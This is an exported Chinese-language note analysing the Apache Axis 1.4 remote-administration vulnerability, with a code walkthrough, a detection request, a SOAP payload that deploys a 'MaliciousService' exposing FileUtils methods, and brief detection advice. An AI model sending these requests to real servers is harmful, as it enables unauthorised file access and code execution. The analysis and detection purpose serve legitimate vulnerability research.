<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 9.0.5 (458014)"/><meta name="author" content="venscor@163.com"/><meta name="created" content="2019-06-17 12:31:56 +0000"/><meta name="source" content="desktop.mac"/><meta name="updated" content="2019-06-17 14:53:04 +0000"/><meta name="content-class" content="yinxiang.markdown"/><title>AXIS 远程管理漏洞</title></head><body><div style="font-size: 14px; margin: 0; padding: 0; width: 100%;"><h1 style="line-height: 160%; box-sizing: content-box; font-weight: 700; font-size: 41px; border-bottom: 3px double #999; color: #000; margin-top: 14px;">1、漏洞描述</h1>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">axis 在版本小于等于1.4时，如果开启了WSDD远程管理，可能导致服务请命令执行漏洞。</p>
<h1 style="line-height: 160%; box-sizing: content-box; font-weight: 700; font-size: 41px; border-bottom: 3px double #999; color: #000;">2、组件描述</h1>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">AXIS分两个版本，axis1和axis2，axis1的最高版本就是1.4，也就是说axis1，在满足特定条件时，漏洞肯定存在。axis是webservice相关的一个组件，具体不详叙述。</p>
<h1 style="line-height: 160%; box-sizing: content-box; font-weight: 700; font-size: 41px; border-bottom: 3px double #999; color: #000;">3、漏洞分析</h1>
<h2 style="line-height: 160%; box-sizing: content-box; font-weight: 700; font-size: 34px; border-bottom: 1px solid #dbdbdb; color: #333;">3.1 简单分析</h2>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">根据情报：https://www.gdcert.com.cn/index/news_detail/W1BZRDEYCh0cDRkcGw指出，当业务将WEBINF目录下的server-config.wsdd配置文件中的enableRemoteAdmin设置为true时，将导致漏洞。并指出了漏洞触发的url是：/services/AdminService 及 /services/FreeMarkerService 。并且，这个值默认情况是false，仅当业务自己开启时，才会存在漏洞。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">分别下载axis 1.4的源码和安装包，find / -name server-config.wsdd全局搜索server-config.wsdd文件，发现仅源码的一个地方出现了此文件，安装包里并未出现此配置文件。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;"><img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617204403.jpg" height="648" width="1455"/></p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">于是一番搜索，看怎么配置此文件，发现axis有一种部署webservice的方式，就是通过WSDD方式部署，部署命令如下，参考：https://blog.csdn.net/qq_14852397/article/details/46385713。</p>
<pre style="line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; margin: 2px 0 8px; background-color: #f5f7f8;"><code style="display: block; overflow-x: auto; background: #1e1e1e; line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; letter-spacing: -.3px; padding: 18px; color: #f4f4f4; white-space: pre-wrap;">java -Djava.ext.dirs=/export/servers/tomcat8.5.41/apache-tomcat-8.5.41/webapps/axis/WEB-INF/lib org.apache.axis.client.AdminClient ./deploy.wsdd
</code></pre>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">部署完成后，统计目录下会生成server-config.wsdd文件，观察文件发现，可以在deploy.wsdd文件中开启远程管理功能，配置如下：</p>
<pre style="line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; margin: 2px 0 8px; background-color: #f5f7f8;"><code style="display: block; overflow-x: auto; background: #1e1e1e; line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; letter-spacing: -.3px; padding: 18px; color: #f4f4f4; white-space: pre-wrap;"><span style="color: #57a64a; font-style: italic; line-height: 160%; box-sizing: content-box;">&lt;!-- deploy.wsdd --&gt;</span>
<span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">deployment</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">xmlns</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"http://xml.apache.org/axis/wsdd/"</span>
            <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">xmlns:java</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"http://xml.apache.org/axis/wsdd/providers/java"</span>&gt;</span>

 <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">service</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">name</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"MyService"</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">provider</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"java:RPC"</span>&gt;</span>
  <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">parameter</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">name</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"className"</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">value</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"samples.userguide.example3.MyService"</span>/&gt;</span>
  <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">parameter</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">name</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"allowedMethods"</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">value</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"*"</span>/&gt;</span>
 <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;/<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">service</span>&gt;</span>

 <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">service</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">name</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"AdminService"</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">provider</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"java:MSG"</span>&gt;</span>
  <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">namespace</span>&gt;</span>http://xml.apache.org/axis/wsdd/<span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;/<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">namespace</span>&gt;</span>
  <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">parameter</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">name</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"allowedMethods"</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">value</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"AdminService"</span>/&gt;</span>
  <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">parameter</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">name</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"enableRemoteAdmin"</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">value</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"true"</span>/&gt;</span>
  <span style="color: #57a64a; font-style: italic; line-height: 160%; box-sizing: content-box;">&lt;!--此处设置为true，就开启了远程管理功能--&gt;</span>
  <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">parameter</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">name</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"className"</span> <span style="color: #9cdcfe; line-height: 160%; box-sizing: content-box;">value</span>=<span style="color: #d69d85; line-height: 160%; box-sizing: content-box;">"org.apache.axis.utils.Admin"</span>/&gt;</span>
 <span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;/<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">service</span>&gt;</span>

<span style="color: #9b9b9b; line-height: 160%; box-sizing: content-box;">&lt;/<span style="color: #569cd6; line-height: 160%; box-sizing: content-box;">deployment</span>&gt;</span>
</code></pre>
<h2 style="line-height: 160%; box-sizing: content-box; font-weight: 700; font-size: 34px; border-bottom: 1px solid #dbdbdb; color: #333;">3.2 跟代码写poc</h2>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">通过上面开启了enableRemoteAdmin之后，开始测试。通过http://localhost:8080/axis访问到http://localhost:8080/axis/services/MyService?wsdl。然后抓包，使用wsdler解析wsdl文件。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;"><img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617220805.jpg" height="526" width="1670"/></p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">发包发现，提示缺少了“deployment”。于是修改POST包，直接改成deployment。发现响应正常。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;"><img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617221110.jpg" height="336" width="1671"/></p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">在没有开启enableRemoteAdmin为true时，响应值包含以下字符。</p>
<pre style="line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; margin: 2px 0 8px; background-color: #f5f7f8;"><code style="display: block; overflow-x: auto; background: #1e1e1e; line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; letter-spacing: -.3px; padding: 18px; color: #f4f4f4; white-space: pre-wrap;">Remote administrator access is not allowed!
</code></pre>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">至此，其实对于黑盒检测的poc已经出来了，如下：</p>
<pre style="line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; margin: 2px 0 8px; background-color: #f5f7f8;"><code style="display: block; overflow-x: auto; background: #1e1e1e; line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; letter-spacing: -.3px; padding: 18px; color: #f4f4f4; white-space: pre-wrap;">POST /axis/services/AdminService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=A3082F3D034EFE0BB8A33E8D706A2959
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.180.80:2233
Content-Length: 249

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/"&gt;
   &lt;soapenv:Header/&gt;
   &lt;soapenv:Body&gt;
      &lt;wsdd:deployment&gt;anyType&lt;/wsdd:deployment&gt;
   &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre>
<h2 style="line-height: 160%; box-sizing: content-box; font-weight: 700; font-size: 34px; border-bottom: 1px solid #dbdbdb; color: #333;">3.3 如何漏洞利用</h2>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">根据webservice看下代码。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;"><img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617221700.jpg" height="406" width="986"/><br/>
描述符和前面的server-config.wsdd文件可以看到，对应的文件是org.apache.axis.utils.Admin.java，方法是AdminService（）方法。<br/>
<img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617222040.jpg" height="264" width="963"/></p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;"><img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617222227.jpg" height="642" width="1142"/><br/>
在process（）方法中调用了查看配置，也就是server-config.wsdd文件是否将enableRemoteAdmin设置为true，如果为false，会验证请求的IP是否为本地IP，不是的话，会抛出异常。也就是说，当没有漏洞时，response里有此特征。（就是上面提到的黑盒检测时无漏洞的特征）<br/>
<img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617222726.jpg" height="807" width="1188"/></p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">继续跟进processWSDD（）方法。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;"><img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617223234.jpg" height="873" width="1357"/><br/>
可以看到这个方法就是根据request里面的xml内容生成新的webservice。因此，也就是根据WSDDocument这个类来生成可以漏洞利用的payload。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;"><img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617223652.jpg" height="856" width="1210"/></p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">例如，可以将org.apache.commons.io.FileUtils生成webservice，从而远程调用其相关方法。</p>
<pre style="line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; margin: 2px 0 8px; background-color: #f5f7f8;"><code style="display: block; overflow-x: auto; background: #1e1e1e; line-height: 160%; box-sizing: content-box; border: 0; border-radius: 0; letter-spacing: -.3px; padding: 18px; color: #f4f4f4; white-space: pre-wrap;">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/"&gt;
   &lt;soapenv:Header/&gt;
   &lt;soapenv:Body&gt;
     &lt;ns1:deployment
            xmlns="http://xml.apache.org/axis/wsdd/"
            xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
            xmlns:ns1="http://xml.apache.org/axis/wsdd/"&gt;
            &lt;ns1:service name="MaliciousService" provider="java:RPC"&gt;
                &lt;ns1:parameter name="className" value="org.apache.commons.io.FileUtils"/&gt;
                &lt;ns1:parameter name="allowedMethods" value="*"/&gt;
            &lt;/ns1:service&gt;
        &lt;/ns1:deployment&gt;
   &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</code></pre>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;"><img src="AXIS%20%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E.resources/%E4%BC%81%E4%B8%9A%E5%92%9A%E5%92%9A20190617224421.jpg" height="1011" width="1390"/></p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">至此，分析完成，这里没写情报里说的利用freemarker进行命令执行，感兴趣的可以看看。其实原理一样，就是利用payload的依赖不一样，也就是将freemarker里面相关的类生成webservice。时间有限，感兴趣自行分析。</p>
<h1 style="line-height: 160%; box-sizing: content-box; font-weight: 700; font-size: 41px; border-bottom: 3px double #999; color: #000;">4、如何检测与防御</h1>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">这里简单写到如何检测。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">白盒：全局检测代码，enableRemoteAdmin是否被设置为true。<br/>
黑盒：见poc。<br/>
流量与WAF：检查是否有/axis/services/AdminService访问记录，报警。当然也可以同时匹配response是否有成功特征。</p>
<p style="line-height: 160%; box-sizing: content-box; margin: 10px 0; color: #333;">本人水平有限，时间匆忙，如有错误或者不当指出，还请不吝指正。</p>
</div><center style="display:none !important;visibility:collapse !important;height:0 !important;white-space:nowrap;width:100%;overflow:hidden">%23%201%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%0Aaxis%20%E5%9C%A8%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E1.4%E6%97%B6%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%BC%80%E5%90%AF%E4%BA%86WSDD%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E6%9C%8D%E5%8A%A1%E8%AF%B7%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E3%80%82%0A%0A%23%202%E3%80%81%E7%BB%84%E4%BB%B6%E6%8F%8F%E8%BF%B0%0AAXIS%E5%88%86%E4%B8%A4%E4%B8%AA%E7%89%88%E6%9C%AC%EF%BC%8Caxis1%E5%92%8Caxis2%EF%BC%8Caxis1%E7%9A%84%E6%9C%80%E9%AB%98%E7%89%88%E6%9C%AC%E5%B0%B1%E6%98%AF1.4%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4axis1%EF%BC%8C%E5%9C%A8%E6%BB%A1%E8%B6%B3%E7%89%B9%E5%AE%9A%E6%9D%A1%E4%BB%B6%E6%97%B6%EF%BC%8C%E6%BC%8F%E6%B4%9E%E8%82%AF%E5%AE%9A%E5%AD%98%E5%9C%A8%E3%80%82axis%E6%98%AFwebservice%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%80%E4%B8%AA%E7%BB%84%E4%BB%B6%EF%BC%8C%E5%85%B7%E4%BD%93%E4%B8%8D%E8%AF%A6%E5%8F%99%E8%BF%B0%E3%80%82%0A%0A%23%203%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%0A%23%23%203.1%20%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%0A%E6%A0%B9%E6%8D%AE%E6%83%85%E6%8A%A5%EF%BC%9Ahttps%3A%2F%2Fwww.gdcert.com.cn%2Findex%2Fnews_detail%2FW1BZRDEYCh0cDRkcGw%E6%8C%87%E5%87%BA%EF%BC%8C%E5%BD%93%E4%B8%9A%E5%8A%A1%E5%B0%86WEBINF%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84server-config.wsdd%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84enableRemoteAdmin%E8%AE%BE%E7%BD%AE%E4%B8%BAtrue%E6%97%B6%EF%BC%8C%E5%B0%86%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E%E3%80%82%E5%B9%B6%E6%8C%87%E5%87%BA%E4%BA%86%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%9A%84url%E6%98%AF%EF%BC%9A%2Fservices%2FAdminService%20%E5%8F%8A%20%2Fservices%2FFreeMarkerService%20%E3%80%82%E5%B9%B6%E4%B8%94%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%80%BC%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E6%98%AFfalse%EF%BC%8C%E4%BB%85%E5%BD%93%E4%B8%9A%E5%8A%A1%E8%87%AA%E5%B7%B1%E5%BC%80%E5%90%AF%E6%97%B6%EF%BC%8C%E6%89%8D%E4%BC%9A%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E3%80%82%0A%0A%E5%88%86%E5%88%AB%E4%B8%8B%E8%BD%BDaxis%201.4%E7%9A%84%E6%BA%90%E7%A0%81%E5%92%8C%E5%AE%89%E8%A3%85%E5%8C%85%EF%BC%8Cfind%20%2F%20-name%20server-config.wsdd%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2server-config.wsdd%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%BB%85%E6%BA%90%E7%A0%81%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9C%B0%E6%96%B9%E5%87%BA%E7%8E%B0%E4%BA%86%E6%AD%A4%E6%96%87%E4%BB%B6%EF%BC%8C%E5%AE%89%E8%A3%85%E5%8C%85%E9%87%8C%E5%B9%B6%E6%9C%AA%E5%87%BA%E7%8E%B0%E6%AD%A4%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E3%80%82%0A%0A!%5B5f86f060c6152db66ef9c9d4710494fc.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp733)%0A%0A%E4%BA%8E%E6%98%AF%E4%B8%80%E7%95%AA%E6%90%9C%E7%B4%A2%EF%BC%8C%E7%9C%8B%E6%80%8E%E4%B9%88%E9%85%8D%E7%BD%AE%E6%AD%A4%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0axis%E6%9C%89%E4%B8%80%E7%A7%8D%E9%83%A8%E7%BD%B2webservice%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E5%B0%B1%E6%98%AF%E9%80%9A%E8%BF%87WSDD%E6%96%B9%E5%BC%8F%E9%83%A8%E7%BD%B2%EF%BC%8C%E9%83%A8%E7%BD%B2%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%8C%E5%8F%82%E8%80%83%EF%BC%9Ahttps%3A%2F%2Fblog.csdn.net%2Fqq_14852397%2Farticle%2Fdetails%2F46385713%E3%80%82%0A%0A%60%60%60%0Ajava%20-Djava.ext.dirs%3D%2Fexport%2Fservers%2Ftomcat8.5.41%2Fapache-tomcat-8.5.41%2Fwebapps%2Faxis%2FWEB-INF%2Flib%20org.apache.axis.client.AdminClient%20.%2Fdeploy.wsdd%0A%60%60%60%0A%E9%83%A8%E7%BD%B2%E5%AE%8C%E6%88%90%E5%90%8E%EF%BC%8C%E7%BB%9F%E8%AE%A1%E7%9B%AE%E5%BD%95%E4%B8%8B%E4%BC%9A%E7%94%9F%E6%88%90server-config.wsdd%E6%96%87%E4%BB%B6%EF%BC%8C%E8%A7%82%E5%AF%9F%E6%96%87%E4%BB%B6%E5%8F%91%E7%8E%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8deploy.wsdd%E6%96%87%E4%BB%B6%E4%B8%AD%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD%EF%BC%8C%E9%85%8D%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A%0A%0A%60%60%60xml%0A%3C!--%20deploy.wsdd%20--%3E%0A%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%0A%20%20%20%20%20%20%20%20%20%20%20%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%0A%0A%20%3Cservice%20name%3D%22MyService%22%20provider%3D%22java%3ARPC%22%3E%0A%20%20%3Cparameter%20name%3D%22className%22%20value%3D%22samples.userguide.example3.MyService%22%2F%3E%0A%20%20%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%0A%20%3C%2Fservice%3E%0A%0A%20%3Cservice%20name%3D%22AdminService%22%20provider%3D%22java%3AMSG%22%3E%0A%20%20%3Cnamespace%3Ehttp%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%3C%2Fnamespace%3E%0A%20%20%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22AdminService%22%2F%3E%0A%20%20%3Cparameter%20name%3D%22enableRemoteAdmin%22%20value%3D%22true%22%2F%3E%0A%20%20%3C!--%E6%AD%A4%E5%A4%84%E8%AE%BE%E7%BD%AE%E4%B8%BAtrue%EF%BC%8C%E5%B0%B1%E5%BC%80%E5%90%AF%E4%BA%86%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD--%3E%0A%20%20%3Cparameter%20name%3D%22className%22%20value%3D%22org.apache.axis.utils.Admin%22%2F%3E%0A%20%3C%2Fservice%3E%0A%0A%3C%2Fdeployment%3E%0A%60%60%60%0A%23%23%203.2%20%E8%B7%9F%E4%BB%A3%E7%A0%81%E5%86%99poc%0A%0A%E9%80%9A%E8%BF%87%E4%B8%8A%E9%9D%A2%E5%BC%80%E5%90%AF%E4%BA%86enableRemoteAdmin%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%BC%80%E5%A7%8B%E6%B5%8B%E8%AF%95%E3%80%82%E9%80%9A%E8%BF%87http%3A%2F%2Flocalhost%3A8080%2Faxis%E8%AE%BF%E9%97%AE%E5%88%B0http%3A%2F%2Flocalhost%3A8080%2Faxis%2Fservices%2FMyService%3Fwsdl%E3%80%82%E7%84%B6%E5%90%8E%E6%8A%93%E5%8C%85%EF%BC%8C%E4%BD%BF%E7%94%A8wsdler%E8%A7%A3%E6%9E%90wsdl%E6%96%87%E4%BB%B6%E3%80%82%0A%0A!%5B38b50fd81d86e74f6e72166afbc38543.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp734)%0A%0A%0A%E5%8F%91%E5%8C%85%E5%8F%91%E7%8E%B0%EF%BC%8C%E6%8F%90%E7%A4%BA%E7%BC%BA%E5%B0%91%E4%BA%86%E2%80%9Cdeployment%E2%80%9D%E3%80%82%E4%BA%8E%E6%98%AF%E4%BF%AE%E6%94%B9POST%E5%8C%85%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%94%B9%E6%88%90deployment%E3%80%82%E5%8F%91%E7%8E%B0%E5%93%8D%E5%BA%94%E6%AD%A3%E5%B8%B8%E3%80%82%0A%0A%0A!%5B6c02d3380abb228ef2923c230b2ad4b2.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp735)%0A%0A%0A%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%BC%80%E5%90%AFenableRemoteAdmin%E4%B8%BAtrue%E6%97%B6%EF%BC%8C%E5%93%8D%E5%BA%94%E5%80%BC%E5%8C%85%E5%90%AB%E4%BB%A5%E4%B8%8B%E5%AD%97%E7%AC%A6%E3%80%82%0A%0A%60%60%60%0ARemote%20administrator%20access%20is%20not%20allowed!%0A%60%60%60%0A%0A%E8%87%B3%E6%AD%A4%EF%BC%8C%E5%85%B6%E5%AE%9E%E5%AF%B9%E4%BA%8E%E9%BB%91%E7%9B%92%E6%A3%80%E6%B5%8B%E7%9A%84poc%E5%B7%B2%E7%BB%8F%E5%87%BA%E6%9D%A5%E4%BA%86%EF%BC%8C%E5%A6%82%E4%B8%8B%EF%BC%9A%0A%0A%60%60%60%0APOST%20%2Faxis%2Fservices%2FAdminService%20HTTP%2F1.1%0AUpgrade-Insecure-Requests%3A%201%0AUser-Agent%3A%20Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_13_1)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F75.0.3770.90%20Safari%2F537.36%0AAccept%3A%20text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Fwebp%2Cimage%2Fapng%2C*%2F*%3Bq%3D0.8%2Capplication%2Fsigned-exchange%3Bv%3Db3%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%2Cen%3Bq%3D0.8%0ACookie%3A%20JSESSIONID%3DA3082F3D034EFE0BB8A33E8D706A2959%0AConnection%3A%20close%0ASOAPAction%3A%20%0AContent-Type%3A%20text%2Fxml%3Bcharset%3DUTF-8%0AHost%3A%20192.168.180.80%3A2233%0AContent-Length%3A%20249%0A%0A%3Csoapenv%3AEnvelope%20xmlns%3Asoapenv%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22%20xmlns%3Awsdd%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%0A%20%20%20%3Csoapenv%3AHeader%2F%3E%0A%20%20%20%3Csoapenv%3ABody%3E%0A%20%20%20%20%20%20%3Cwsdd%3Adeployment%3EanyType%3C%2Fwsdd%3Adeployme